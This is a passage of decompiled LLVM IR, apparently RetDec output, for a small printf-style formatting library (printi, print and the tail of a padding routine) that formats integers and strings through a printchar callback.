dec_label_pc_87d4:                                ; preds = %dec_label_pc_87b8
  %v2_87dc = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87b8, %dec_label_pc_87d4
  %storemerge4 = phi i32 [ %v2_87dc, %dec_label_pc_87d4 ], [ 0, %dec_label_pc_87b8 ]
  %v1_87e8 = and i32 %arg4, 2
  %v2_87ec = icmp eq i32 %v1_87e8, 0
  br i1 %v2_87ec, label %dec_label_pc_87fc, label %dec_label_pc_87f4

dec_label_pc_87f4:                                ; preds = %dec_label_pc_87e4
  br label %dec_label_pc_87fc

dec_label_pc_87fc:                                ; preds = %dec_label_pc_87e4, %entry, %dec_label_pc_87f4
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge4, %dec_label_pc_87e4 ], [ %storemerge4, %dec_label_pc_87f4 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_87e4 ], [ 48, %dec_label_pc_87f4 ]
  %v1_8800 = urem i32 %arg4, 2
  %v2_8804 = icmp eq i32 %v1_8800, 0
  br i1 %v2_8804, label %dec_label_pc_8834.preheader, label %dec_label_pc_8870.preheader

dec_label_pc_8834.preheader:                      ; preds = %dec_label_pc_87fc
  %v5_883c17 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_883c17, label %dec_label_pc_8810.lr.ph, label %dec_label_pc_8870.preheader

dec_label_pc_8810.lr.ph:                          ; preds = %dec_label_pc_8834.preheader
  %v2_8818 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8810

dec_label_pc_8810:                                ; preds = %dec_label_pc_8810.lr.ph, %dec_label_pc_8810
  %stack_var_-28.118 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8810.lr.ph ], [ %v1_882c, %dec_label_pc_8810 ]
  %v3_8818 = call i32 @printchar(i32* %v2_8818, i32 %stack_var_-44.0)
  %v3_881c = load i32, i32* %stack_var_-48, align 4
  %v1_8820 = add i32 %v3_881c, 1
  store i32 %v1_8820, i32* %stack_var_-48, align 4
  %v1_882c = add nsw i32 %stack_var_-28.118, -1
  %v5_883c = icmp sgt i32 %stack_var_-28.118, 1
  br i1 %v5_883c, label %dec_label_pc_8810, label %dec_label_pc_8870.preheader

dec_label_pc_8870.preheader:                      ; preds = %dec_label_pc_8810, %dec_label_pc_8834.preheader, %dec_label_pc_87fc
  %v3_88b428 = phi i32 [ 0, %dec_label_pc_87fc ], [ 0, %dec_label_pc_8834.preheader ], [ %v1_8820, %dec_label_pc_8810 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_87fc ], [ %stack_var_-28.0, %dec_label_pc_8834.preheader ], [ 0, %dec_label_pc_8810 ]
  %v2_887410 = load i8, i8* %arg2, align 1
  %v2_887812 = icmp eq i8 %v2_887410, 0
  br i1 %v2_887812, label %dec_label_pc_88a8.preheader, label %dec_label_pc_8844.lr.ph

dec_label_pc_8844.lr.ph:                          ; preds = %dec_label_pc_8870.preheader
  %v2_8854 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8844

dec_label_pc_8844:                                ; preds = %dec_label_pc_8844.lr.ph, %dec_label_pc_8844
  %v4_887014 = phi i32 [ %tmp, %dec_label_pc_8844.lr.ph ], [ %v1_8868, %dec_label_pc_8844 ]
  %stack_var_-24.013 = phi i8* [ %arg2, %dec_label_pc_8844.lr.ph ], [ %v5_886c, %dec_label_pc_8844 ]
  %v2_8848 = load i8, i8* %stack_var_-24.013, align 1
  %v3_8848 = zext i8 %v2_8848 to i32
  %v3_8854 = call i32 @printchar(i32* %v2_8854, i32 %v3_8848)
  %v3_8858 = load i32, i32* %stack_var_-48, align 4
  %v1_885c = add i32 %v3_8858, 1
  store i32 %v1_885c, i32* %stack_var_-48, align 4
  %v1_8868 = add i32 %v4_887014, 1
  %v5_886c = inttoptr i32 %v1_8868 to i8*
  %v2_8874 = load i8, i8* %v5_886c, align 1
  %v2_8878 = icmp eq i8 %v2_8874, 0
  br i1 %v2_8878, label %dec_label_pc_88a8.preheader, label %dec_label_pc_8844

dec_label_pc_88a8.preheader:                      ; preds = %dec_label_pc_8844, %dec_label_pc_8870.preheader
  %v3_88b427 = phi i32 [ %v3_88b428, %dec_label_pc_8870.preheader ], [ %v1_885c, %dec_label_pc_8844 ]
  %v5_88b07 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_88b07, label %dec_label_pc_8884.lr.ph, label %dec_label_pc_88b4

dec_label_pc_8884.lr.ph:                          ; preds = %dec_label_pc_88a8.preheader
  %v2_888c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8884

dec_label_pc_8884:                                ; preds = %dec_label_pc_8884.lr.ph, %dec_label_pc_8884
  %stack_var_-28.38 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_8884.lr.ph ], [ %v1_88a0, %dec_label_pc_8884 ]
  %v3_888c = call i32 @printchar(i32* %v2_888c, i32 %stack_var_-44.0)
  %v3_8890 = load i32, i32* %stack_var_-48, align 4
  %v1_8894 = add i32 %v3_8890, 1
  store i32 %v1_8894, i32* %stack_var_-48, align 4
  %v1_88a0 = add nsw i32 %stack_var_-28.38, -1
  %v5_88b0 = icmp sgt i32 %stack_var_-28.38, 1
  br i1 %v5_88b0, label %dec_label_pc_8884, label %dec_label_pc_88b4

dec_label_pc_88b4:                                ; preds = %dec_label_pc_8884, %dec_label_pc_88a8.preheader
  %v3_88b4 = phi i32 [ %v3_88b427, %dec_label_pc_88a8.preheader ], [ %v1_8894, %dec_label_pc_8884 ]
  store i32 %v3_8744, i32* @fp, align 4
  ret i32 %v3_88b4

; uselistorder directives
  uselistorder i32 %v1_8868, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_87a0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8884, { 1, 0 }
  uselistorder label %dec_label_pc_8844, { 1, 0 }
  uselistorder label %dec_label_pc_8810, { 1, 0 }
  uselistorder label %dec_label_pc_87fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_87e4, { 1, 0 }
  uselistorder label %dec_label_pc_8790, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_88cc = load i32, i32* @fp, align 4
  store i32 35028, i32* %stack_var_-4, align 4
  %v2_88d0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88d0, i32* @fp, align 4
  %v1_8904 = icmp slt i32 %arg2, 0
  %v2_8904 = icmp eq i32 %arg2, 0
  br i1 %v2_8904, label %dec_label_pc_890c, label %dec_label_pc_8940

dec_label_pc_890c:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8930 = bitcast i32* %stack_var_-28 to i8*
  %v6_8930 = call i32 @prints(i32 %arg1, i8* %v5_8930, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_8aa0

dec_label_pc_8940:                                ; preds = %entry
  %v2_8944 = icmp eq i32 %arg4, 0
  br i1 %v2_8944, label %dec_label_pc_8978, label %dec_label_pc_894c

dec_label_pc_894c:                                ; preds = %dec_label_pc_8940
  %v7_8950 = icmp eq i32 %arg3, 10
  br i1 %v7_8950, label %dec_label_pc_8958, label %dec_label_pc_8978

dec_label_pc_8958:                                ; preds = %dec_label_pc_894c
  br i1 %v1_8904, label %dec_label_pc_8964, label %dec_label_pc_8978

dec_label_pc_8964:                                ; preds = %dec_label_pc_8958
  %v1_8970 = sub i32 0, %arg2
  br label %dec_label_pc_8978

dec_label_pc_8978:                                ; preds = %dec_label_pc_8958, %dec_label_pc_894c, %dec_label_pc_8940, %dec_label_pc_8964
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_8940 ], [ %v1_8970, %dec_label_pc_8964 ], [ %arg2, %dec_label_pc_8958 ], [ %arg2, %dec_label_pc_894c ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8940 ], [ 1, %dec_label_pc_8964 ], [ 0, %dec_label_pc_8958 ], [ 0, %dec_label_pc_894c ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_8a0c4 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_8a0c4, label %dec_label_pc_8a14, label %dec_label_pc_8994.lr.ph

dec_label_pc_8994.lr.ph:                          ; preds = %dec_label_pc_8978
  %v1_89bc = add i32 %arg7, -58
  br label %dec_label_pc_8994

dec_label_pc_8994:                                ; preds = %dec_label_pc_8994.lr.ph, %dec_label_pc_89cc
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_8994.lr.ph ], [ %v2_89a0, %dec_label_pc_89cc ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_8994.lr.ph ], [ %v5_89d4, %dec_label_pc_89cc ]
  %v2_89a0 = udiv i32 %stack_var_-52.16, %arg3
  %v3_89a0 = urem i32 %stack_var_-52.16, %arg3
  %v7_89b4 = icmp slt i32 %v3_89a0, 10
  br i1 %v7_89b4, label %dec_label_pc_89cc, label %dec_label_pc_89b8

dec_label_pc_89b8:                                ; preds = %dec_label_pc_8994
  %v2_89c4 = add i32 %v3_89a0, %v1_89bc
  br label %dec_label_pc_89cc

dec_label_pc_89cc:                                ; preds = %dec_label_pc_8994, %dec_label_pc_89b8
  %stack_var_-64.0 = phi i32 [ %v3_89a0, %dec_label_pc_8994 ], [ %v2_89c4, %dec_label_pc_89b8 ]
  %v4_89cc = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_89d0 = add i32 %v4_89cc, -1
  %v5_89d4 = inttoptr i32 %v1_89d0 to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_89ec = trunc i32 %fold to i8
  store i8 %v1_89ec, i8* %v5_89d4, align 1
  %v2_8a0c = icmp ult i32 %stack_var_-52.16, %arg3
  br i1 %v2_8a0c, label %dec_label_pc_8a14, label %dec_label_pc_8994

dec_label_pc_8a14:                                ; preds = %dec_label_pc_89cc, %dec_label_pc_8978
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_8978 ], [ %v5_89d4, %dec_label_pc_89cc ]
  %v2_8a18 = icmp eq i32 %stack_var_-60.0, 0
  br i1 %v2_8a18, label %dec_label_pc_8a7c, label %dec_label_pc_8a20

dec_label_pc_8a20:                                ; preds = %dec_label_pc_8a14
  %v3_8a20 = load i32, i32* %stack_var_0, align 4
  %v2_8a24 = icmp eq i32 %v3_8a20, 0
  br i1 %v2_8a24, label %dec_label_pc_8a64, label %dec_label_pc_8a2c

dec_label_pc_8a2c:                                ; preds = %dec_label_pc_8a20
  %v1_8a30 = and i32 %arg6, 2
  %v2_8a34 = icmp eq i32 %v1_8a30, 0
  br i1 %v2_8a34, label %dec_label_pc_8a64, label %dec_label_pc_8a3c

dec_label_pc_8a3c:                                ; preds = %dec_label_pc_8a2c
  %v2_8a44 = inttoptr i32 %arg1 to i32*
  %v3_8a44 = call i32 @printchar(i32* %v2_8a44, i32 45)
  %v3_8a54 = load i32, i32* %stack_var_0, align 4
  %v1_8a58 = add i32 %v3_8a54, -1
  store i32 %v1_8a58, i32* %stack_var_0, align 4
  br label %dec_label_pc_8a7c

dec_label_pc_8a64:                                ; preds = %dec_label_pc_8a2c, %dec_label_pc_8a20
  %v4_8a64 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_8a68 = add i32 %v4_8a64, -1
  %v5_8a6c = inttoptr i32 %v1_8a68 to i8*
  store i8 45, i8* %v5_8a6c, align 1
  br label %dec_label_pc_8a7c

dec_label_pc_8a7c:                                ; preds = %dec_label_pc_8a14, %dec_label_pc_8a3c, %dec_label_pc_8a64
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_8a14 ], [ %v5_8a6c, %dec_label_pc_8a64 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_8a3c ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8a14 ], [ 0, %dec_label_pc_8a64 ], [ 1, %dec_label_pc_8a3c ]
  %v3_8a84 = load i32, i32* %stack_var_0, align 4
  %v6_8a8c = call i32 @prints(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_8a84, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8a98 = add i32 %v6_8a8c, %stack_var_-56.0
  br label %dec_label_pc_8aa0

dec_label_pc_8aa0:                                ; preds = %dec_label_pc_890c, %dec_label_pc_8a7c
  %storemerge2 = phi i32 [ %v2_8a98, %dec_label_pc_8a7c ], [ %v6_8930, %dec_label_pc_890c ]
  store i32 %v3_88cc, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_89d4, { 0, 2, 1 }
  uselistorder i32 %v3_89a0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8aa0, { 1, 0 }
  uselistorder label %dec_label_pc_8a7c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_89cc, { 1, 0 }
  uselistorder label %dec_label_pc_8994, { 1, 0 }
  uselistorder label %dec_label_pc_8978, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 35520, i32* %stack_var_-4, align 4
  %v2_8abc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8abc, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_8e6829 = load i8, i8* %stack_var_-32.428, align 1
  %v2_8e6c31 = icmp eq i8 %v2_8e6829, 0
  br i1 %v2_8e6c31, label %dec_label_pc_8e74, label %dec_label_pc_8adc.lr.ph

dec_label_pc_8adc.lr.ph:                          ; preds = %entry
  %v5_8e20 = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8adc

dec_label_pc_8adc:                                ; preds = %dec_label_pc_8adc.lr.ph, %dec_label_pc_8e58
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_8adc.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_8e58 ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_8adc.lr.ph ], [ %v1_8e5c, %dec_label_pc_8e58 ]
  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_8adc.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_8e58 ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_8adc.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_8e58 ]
  %v2_8ae0 = load i8, i8* %stack_var_-32.435, align 1
  %v7_8ae4 = icmp eq i8 %v2_8ae0, 37
  br i1 %v7_8ae4, label %dec_label_pc_8aec, label %dec_label_pc_8e38

dec_label_pc_8aec:                                ; preds = %dec_label_pc_8adc
  %v1_8af0 = add i32 %stack_var_-32.4.in34, 1
  %v5_8af4 = inttoptr i32 %v1_8af0 to i8*
  %v2_8b0c = load i8, i8* %v5_8af4, align 1
  %v2_8b10 = icmp eq i8 %v2_8b0c, 0
  br i1 %v2_8b10, label %dec_label_pc_8e74, label %dec_label_pc_8b18

dec_label_pc_8b18:                                ; preds = %dec_label_pc_8aec
  %v2_8b1c = load i8, i8* %v5_8af4, align 1
  %v7_8b20 = icmp eq i8 %v2_8b1c, 37
  br i1 %v7_8b20, label %dec_label_pc_8e38, label %dec_label_pc_8b28

dec_label_pc_8b28:                                ; preds = %dec_label_pc_8b18
  %v2_8b2c = load i8, i8* %v5_8af4, align 1
  %v7_8b30 = icmp eq i8 %v2_8b2c, 45
  br i1 %v7_8b30, label %dec_label_pc_8b38, label %dec_label_pc_8b68.preheader

dec_label_pc_8b38:                                ; preds = %dec_label_pc_8b28
  %v1_8b3c = add i32 %stack_var_-32.4.in34, 2
  %v5_8b40 = inttoptr i32 %v1_8b3c to i8*
  br label %dec_label_pc_8b68.preheader

dec_label_pc_8b68.preheader:                      ; preds = %dec_label_pc_8b38, %dec_label_pc_8b28
  %stack_var_-32.0.ph = phi i8* [ %v5_8af4, %dec_label_pc_8b28 ], [ %v5_8b40, %dec_label_pc_8b38 ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_8b28 ], [ 1, %dec_label_pc_8b38 ]
  %v4_8b682 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_8b6c3 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_8b707 = icmp eq i8 %v2_8b6c3, 48
  br i1 %v7_8b707, label %dec_label_pc_8b50, label %dec_label_pc_8bb4.preheader

dec_label_pc_8b50:                                ; preds = %dec_label_pc_8b68.preheader, %dec_label_pc_8b50
  %v4_8b689 = phi i32 [ %v1_8b54, %dec_label_pc_8b50 ], [ %v4_8b682, %dec_label_pc_8b68.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_8b60, %dec_label_pc_8b50 ], [ %stack_var_-48.0.ph, %dec_label_pc_8b68.preheader ]
  %v1_8b54 = add i32 %v4_8b689, 1
  %v5_8b58 = inttoptr i32 %v1_8b54 to i8*
  %v1_8b60 = or i32 %stack_var_-48.08, 2
  %v2_8b6c = load i8, i8* %v5_8b58, align 1
  %v7_8b70 = icmp eq i8 %v2_8b6c, 48
  br i1 %v7_8b70, label %dec_label_pc_8b50, label %dec_label_pc_8bb4.preheader

dec_label_pc_8bb4.preheader:                      ; preds = %dec_label_pc_8b50, %dec_label_pc_8b68.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_8b68.preheader ], [ %v1_8b60, %dec_label_pc_8b50 ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_8b68.preheader ], [ %v5_8b58, %dec_label_pc_8b50 ]
  %v4_8bb411 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_8bb812 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8bb812, 48
  br i1 %tmp60, label %dec_label_pc_8bd4, label %dec_label_pc_8bc4

dec_label_pc_8b7c:                                ; preds = %dec_label_pc_8bc4
  %v2_8b88 = mul i32 %stack_var_-52.019, 10
  %v2_8b94 = load i8, i8* %stack_var_-32.120, align 1
  %v3_8b94 = zext i8 %v2_8b94 to i32
  %v1_8b98 = add i32 %v2_8b88, -48
  %v2_8ba0 = add i32 %v1_8b98, %v3_8b94
  %v1_8bac = add i32 %v4_8bb421, 1
  %v5_8bb0 = inttoptr i32 %v1_8bac to i8*
  %v2_8bb8 = load i8, i8* %v5_8bb0, align 1
  %tmp61 = icmp ult i8 %v2_8bb8, 48
  br i1 %tmp61, label %dec_label_pc_8bd4, label %dec_label_pc_8bc4

dec_label_pc_8bc4:                                ; preds = %dec_label_pc_8bb4.preheader, %dec_label_pc_8b7c
  %v4_8bb421 = phi i32 [ %v1_8bac, %dec_label_pc_8b7c ], [ %v4_8bb411, %dec_label_pc_8bb4.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_8bb0, %dec_label_pc_8b7c ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8bb4.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_8ba0, %dec_label_pc_8b7c ], [ 0, %dec_label_pc_8bb4.preheader ]
  %v2_8bc8 = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_8bc8, 58
  br i1 %tmp62, label %dec_label_pc_8b7c, label %dec_label_pc_8bd4

dec_label_pc_8bd4:                                ; preds = %dec_label_pc_8b7c, %dec_label_pc_8bc4, %dec_label_pc_8bb4.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_8bb4.preheader ], [ %v2_8ba0, %dec_label_pc_8b7c ], [ %stack_var_-52.019, %dec_label_pc_8bc4 ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_8bb4.preheader ], [ %v5_8bb0, %dec_label_pc_8b7c ], [ %stack_var_-32.120, %dec_label_pc_8bc4 ]
  %v2_8bd8 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8bdc = icmp eq i8 %v2_8bd8, 115
  br i1 %v7_8bdc, label %dec_label_pc_8be4, label %dec_label_pc_8c48

dec_label_pc_8be4:                                ; preds = %dec_label_pc_8bd4
  %v1_8be8 = add i32 %stack_var_-36.133, 4
  %v1_8bf4 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8bf4 = load i32, i32* %v1_8bf4, align 4
  %v2_8c00 = icmp eq i32 %v2_8bf4, 0
  br i1 %v2_8c00, label %dec_label_pc_8c14, label %dec_label_pc_8c08

dec_label_pc_8c08:                                ; preds = %dec_label_pc_8be4
  %v5_8c0c = inttoptr i32 %v2_8bf4 to i8*
  br label %dec_label_pc_8c1c

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8be4
  br label %dec_label_pc_8c1c

dec_label_pc_8c1c:                                ; preds = %dec_label_pc_8c08, %dec_label_pc_8c14
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18a38.41, i32 0, i32 0), %dec_label_pc_8c14 ], [ %v5_8c0c, %dec_label_pc_8c08 ]
  %v7_8c30 = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8c3c = add i32 %v7_8c30, %stack_var_-44.132
  br label %dec_label_pc_8e58

dec_label_pc_8c48:                                ; preds = %dec_label_pc_8bd4
  %v2_8c4c = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c50 = icmp eq i8 %v2_8c4c, 100
  br i1 %v7_8c50, label %dec_label_pc_8c58, label %dec_label_pc_8cac

dec_label_pc_8c58:                                ; preds = %dec_label_pc_8c48
  %v1_8c5c = add i32 %stack_var_-36.133, 4
  %v1_8c68 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c68 = load i32, i32* %v1_8c68, align 4
  %v7_8c94 = call i32 @printi(i32 %tmp, i32 %v2_8c68, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8ca0 = add i32 %v7_8c94, %stack_var_-44.132
  br label %dec_label_pc_8e58

dec_label_pc_8cac:                                ; preds = %dec_label_pc_8c48
  %v2_8cb0 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8cb4 = icmp eq i8 %v2_8cb0, 120
  br i1 %v7_8cb4, label %dec_label_pc_8cbc, label %dec_label_pc_8d10

dec_label_pc_8cbc:                                ; preds = %dec_label_pc_8cac
  %v1_8cc0 = add i32 %stack_var_-36.133, 4
  %v1_8ccc = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8ccc = load i32, i32* %v1_8ccc, align 4
  %v7_8cf8 = call i32 @printi(i32 %tmp, i32 %v2_8ccc, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8d04 = add i32 %v7_8cf8, %stack_var_-44.132
  br label %dec_label_pc_8e58

dec_label_pc_8d10:                                ; preds = %dec_label_pc_8cac
  %v2_8d14 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8d18 = icmp eq i8 %v2_8d14, 88
  br i1 %v7_8d18, label %dec_label_pc_8d20, label %dec_label_pc_8d74

dec_label_pc_8d20:                                ; preds = %dec_label_pc_8d10
  %v1_8d24 = add i32 %stack_var_-36.133, 4
  %v1_8d30 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8d30 = load i32, i32* %v1_8d30, align 4
  %v7_8d5c = call i32 @printi(i32 %tmp, i32 %v2_8d30, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_8d68 = add i32 %v7_8d5c, %stack_var_-44.132
  br label %dec_label_pc_8e58

dec_label_pc_8d74:                                ; preds = %dec_label_pc_8d10
  %v2_8d78 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8d7c = icmp eq i8 %v2_8d78, 117
  br i1 %v7_8d7c, label %dec_label_pc_8d84, label %dec_label_pc_8dd8

dec_label_pc_8d84:                                ; preds = %dec_label_pc_8d74
  %v1_8d88 = add i32 %stack_var_-36.133, 4
  %v1_8d94 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8d94 = load i32, i32* %v1_8d94, align 4
  %v7_8dc0 = call i32 @printi(i32 %tmp, i32 %v2_8d94, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8dcc = add i32 %v7_8dc0, %stack_var_-44.132
  br label %dec_label_pc_8e58

dec_label_pc_8dd8:                                ; preds = %dec_label_pc_8d74
  %v2_8ddc = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8de0 = icmp eq i8 %v2_8ddc, 99
  br i1 %v7_8de0, label %dec_label_pc_8de8, label %dec_label_pc_8e58

dec_label_pc_8de8:                                ; preds = %dec_label_pc_8dd8
  %v1_8dec = add i32 %stack_var_-36.133, 4
  %v1_8df8 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8df8 = load i32, i32* %v1_8df8, align 4
  %v1_8dfc = urem i32 %v2_8df8, 256
  store i32 %v1_8dfc, i32* %stack_var_-18, align 4
  %v6_8e20 = call i32 @prints(i32 %tmp, i8* %v5_8e20, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_8dec)
  %v2_8e2c = add i32 %v6_8e20, %stack_var_-44.132
  br label %dec_label_pc_8e58

dec_label_pc_8e38:                                ; preds = %dec_label_pc_8adc, %dec_label_pc_8b18
  %stack_var_-32.2 = phi i8* [ %v5_8af4, %dec_label_pc_8b18 ], [ %stack_var_-32.435, %dec_label_pc_8adc ]
  %v2_8e3c = load i8, i8* %stack_var_-32.2, align 1
  %v3_8e3c = zext i8 %v2_8e3c to i32
  %v3_8e48 = call i32 @printchar(i32* %arg1, i32 %v3_8e3c)
  %v1_8e50 = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_8e58

dec_label_pc_8e58:                                ; preds = %dec_label_pc_8dd8, %dec_label_pc_8de8, %dec_label_pc_8d84, %dec_label_pc_8d20, %dec_label_pc_8cbc, %dec_label_pc_8c58, %dec_label_pc_8c1c, %dec_label_pc_8e38
  %stack_var_-44.0 = phi i32 [ %v1_8e50, %dec_label_pc_8e38 ], [ %v2_8c3c, %dec_label_pc_8c1c ], [ %v2_8ca0, %dec_label_pc_8c58 ], [ %v2_8d04, %dec_label_pc_8cbc ], [ %v2_8d68, %dec_label_pc_8d20 ], [ %v2_8dcc, %dec_label_pc_8d84 ], [ %v2_8e2c, %dec_label_pc_8de8 ], [ %stack_var_-44.132, %dec_label_pc_8dd8 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_8e38 ], [ %v1_8be8, %dec_label_pc_8c1c ], [ %v1_8c5c, %dec_label_pc_8c58 ], [ %v1_8cc0, %dec_label_pc_8cbc ], [ %v1_8d24, %dec_label_pc_8d20 ], [ %v1_8d88, %dec_label_pc_8d84 ], [ %v1_8dec, %dec_label_pc_8de8 ], [ %stack_var_-36.133, %dec_label_pc_8dd8 ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_8e38 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c1c ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c58 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8cbc ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8d20 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8d84 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8de8 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8dd8 ]
  %v4_8e58 = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_8e5c = add i32 %v4_8e58, 1
  %stack_var_-32.4 = inttoptr i32 %v1_8e5c to i8*
  %v2_8e68 = load i8, i8* %stack_var_-32.4, align 1
  %v2_8e6c = icmp eq i8 %v2_8e68, 0
  br i1 %v2_8e6c, label %dec_label_pc_8e74, label %dec_label_pc_8adc

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8aec, %dec_label_pc_8e58, %entry
